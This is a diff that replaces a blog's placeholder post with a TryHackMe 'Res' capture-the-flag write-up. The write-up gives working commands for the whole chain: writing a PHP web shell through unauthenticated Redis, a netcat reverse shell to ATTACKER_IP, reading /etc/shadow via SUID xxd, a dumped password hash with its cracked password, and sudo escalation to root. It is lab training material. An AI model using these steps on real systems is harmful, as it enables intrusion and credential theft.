@@ -1,85 +1,176 @@
 ---
 layout: post
-author: Abhinav Saxena
-tags: [overview, moonwalk]
+author: Ayman ZERDA
+tags: [TryHackme, Res]
 ---
 
-Lorem ipsum[^1] dolor sit amet, consectetur adipiscing elit. Pellentesque vel lacinia neque. Praesent nulla quam, ullamcorper in sollicitudin ac, molestie sed justo. Cras aliquam, sapien id consectetur accumsan, augue magna faucibus ex, ut ultricies turpis tortor vel ante. In at rutrum tellus.
+![header](/images/header1.png)
 
-# Sample heading 1
-## Sample heading 2
-### Sample heading 3
-#### Sample heading 4
-##### Sample heading 5
-###### Sample heading 6
+**Link:** [Res](https://tryhackme.com/room/res)
 
-Mauris viverra dictum ultricies. Vestibulum quis ipsum euismod, facilisis metus sed, varius ipsum. Donec scelerisque lacus libero, eu dignissim sem venenatis at. Etiam id nisl ut lorem gravida euismod.
+## Description : 
+Hack into a vulnerable database server with an in-memory data-structure in this semi-guided challenge!
 
-## Lists
+--- 
 
-Unordered:
+## Enumeration :
+let's scan the target with nmap
 
-- Fusce non velit cursus ligula mattis convallis vel at metus[^2].
-- Sed pharetra tellus massa, non elementum eros vulputate non.
-- Suspendisse potenti.
+```bash
+nmap -sC -sV -T4 -p- 10.10.239.82 
+Starting Nmap 7.92 ( https://nmap.org ) at 2023-02-22 09:06 EST
+Nmap scan report for 10.10.239.82
+Host is up (0.10s latency).
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-title: Apache2 Ubuntu Default Page: It works
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+6379/tcp open  redis   Redis key-value store 6.0.7
 
-Ordered:
-
-1. Quisque arcu felis, laoreet vel accumsan sit amet, fermentum at nunc.
-2. Sed massa quam, auctor in eros quis, porttitor tincidunt orci.
-3. Nulla convallis id sapien ornare viverra.
-4. Nam a est eget ligula pellentesque posuere.
-
-## Blockquote
-
-The following is a blockquote:
-
-> Suspendisse tempus dolor nec risus sodales posuere. Proin dui dui, mollis a consectetur molestie, lobortis vitae tellus.
-
-## Thematic breaks (<hr>)
-
-Mauris viverra dictum ultricies[^3]. Vestibulum quis ipsum euismod, facilisis metus sed, varius ipsum. Donec scelerisque lacus libero, eu dignissim sem venenatis at. Etiam id nisl ut lorem gravida euismod. **You can put some text inside the horizontal rule like so.**
-
----
-{: data-content="hr with text"}
-
-Mauris viverra dictum ultricies. Vestibulum quis ipsum euismod, facilisis metus sed, varius ipsum. Donec scelerisque lacus libero, eu dignissim sem venenatis at. Etiam id nisl ut lorem gravida euismod. **Or you can just have an clean horizontal rule.**
-
----
-
-Mauris viverra dictum ultricies. Vestibulum quis ipsum euismod, facilisis metus sed, varius ipsum. Donec scelerisque lacus libero, eu dignissim sem venenatis at. Etiam id nisl ut lorem gravida euismod. Or you can just have an clean horizontal rule.
-
-## Code
-
-Now some code:
-
-```
-const ultimateTruth = 'follow middlepath';
-console.log(ultimateTruth);
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 28.04 seconds
 ```
 
-And here is some `inline code`!
+* we got 2 open ports: 80 (apache web server) and 5279 (Redis which is a data structure storage service)
+* i did some research and i found some enumeration steps for [Redis](https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis)
+* we can connect to redis service via redis-cli without credentials
 
-## Tables
+**how to install redis-tools**
 
-Now a table:
+```bash
+sudo apt-get install redis-tools
+```
 
-| Tables        | Are           | Cool  |
-| ------------- |:-------------:| -----:|
-| col 3 is      | right-aligned | $1600 |
-| col 2 is      | centered      |   $12 |
-| zebra stripes | are neat      |    $1 |
+## Foothold :
 
-## Images
+* To achieve RCE we need to know the web directory, by default it's /var/www/html and we can be sure if we look at the apache web server
+![proof](/images/proof.png)
 
-![theme logo](http://www.abhinavsaxena.com/images/abhinav.jpeg)
+* Run the following commands to achieve RCE :
 
-This is an image[^4]
 
----
-{: data-content="footnotes"}
+```bash
+redis-cli -h 10.10.239.82
+ 
+10.10.239.82:6379> config set dir /var/www/html
+OK
+10.10.239.82:6379> config set dbfilename shell.php
+OK
+10.10.239.82:6379> set test "<?php system($_GET['cmd']) ?>"
+OK
+10.10.239.82:6379> save
+OK
+10.10.239.82:6379> exit
+```
 
-[^1]: this is a footnote. You should reach here if you click on the corresponding superscript number.
-[^2]: hey there, don't forget to read all the footnotes!
-[^3]: this is another footnote.
-[^4]: this is a very very long footnote to test if a very very long footnote brings some problems or not; hope that there are no problems but you know sometimes problems arise from nowhere.
+
+**let's start a netcat listener**
+
+
+```bash
+# nc -lvnp 1234
+```
+
+**let's trigger the reverse shell by visiting:**
+
+```bash
+http://10.10.239.82/shell.php?cmd=nc ATTACKER_IP PORT -e /bin/bash
+```
+
+![website](/images/revshell.png)
+
+* we are in as www-data
+
+```bash
+# nc -lvnp 1234                         
+listening on [any] 1234 ...
+connect to [10.18.2.136] from (UNKNOWN) [10.10.239.82] 51758
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+whoami
+www-data
+```
+
+* we can upgrade the revese shell using the following commands
+
+```bash
+# python3 -c 'import pty;pty.spawn("/bin/bash")'
+# export TERM=xterm
+PRESS CTRL+Z
+# stty raw -echo; fg
+```
+
+## Horizontal Privilege Escalation :
+* We can see that there is a user called Vianka
+* Let's check the files that have the SUID bit set
+```bash
+find / -perm -u=s -type f 2>/dev/null
+``` 
+![suid](/images/suid.png)
+
+* The results show a binary xxd with the SUID bit set and the owner is root
+
+* next step is to visit [GTFOBins](https://gtfobins.github.io/#)
+
+![xxd](/images/xxd.png)
+
+* We can read any file as root
+* Let's read the shadow file and see if we can crack Vianka's hash
+
+```bash
+www-data@ubuntu:/home/vianka$ xxd /etc/shadow | xxd -r 
+xxd /etc/shadow | xxd -r 
+root:!:18507:0:99999:7:::
+daemon:*:17953:0:99999:7:::
+bin:*:17953:0:99999:7:::
+sys:*:17953:0:99999:7:::
+sync:*:17953:0:99999:7:::
+games:*:17953:0:99999:7:::
+man:*:17953:0:99999:7:::
+lp:*:17953:0:99999:7:::
+mail:*:17953:0:99999:7:::
+news:*:17953:0:99999:7:::
+uucp:*:17953:0:99999:7:::
+proxy:*:17953:0:99999:7:::
+www-data:*:17953:0:99999:7:::
+backup:*:17953:0:99999:7:::
+list:*:17953:0:99999:7:::
+irc:*:17953:0:99999:7:::
+gnats:*:17953:0:99999:7:::
+nobody:*:17953:0:99999:7:::
+systemd-timesync:*:17953:0:99999:7:::
+systemd-network:*:17953:0:99999:7:::
+systemd-resolve:*:17953:0:99999:7:::
+systemd-bus-proxy:*:17953:0:99999:7:::
+syslog:*:17953:0:99999:7:::
+_apt:*:17953:0:99999:7:::
+messagebus:*:18506:0:99999:7:::
+uuidd:*:18506:0:99999:7:::
+vianka:$6$2p.tSTds$qWQfsXwXOAxGJUBuq2RFXqlKiql3jxlwEWZP6CWXm7kIbzR6WzlxHR.UHmi.hc1/TuUOUBo/jWQaQtGSXwvri0:18507:0:99999:7:::
+```
+**crack Viank's hash with john**
+![hash](/images/hash.png)
+
+* switch user to vianka and get the flag 
+
+![user-flag](/images/user-flag.png)
+
+## Vertical Privilege Escalation :
+* Let's check sudo privileges
+
+```bash
+vianka@ubuntu:~$ sudo -l
+sudo -l
+[sudo] password for vianka: beautiful1
+
+Matching Defaults entries for vianka on ubuntu:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User vianka may run the following commands on ubuntu:
+    (ALL : ALL) ALL
+```
+* Vianka can run any commands with sudo
+* All we need to do is run **sudo su**
+
+![root-flag](/images/root-flag.png)
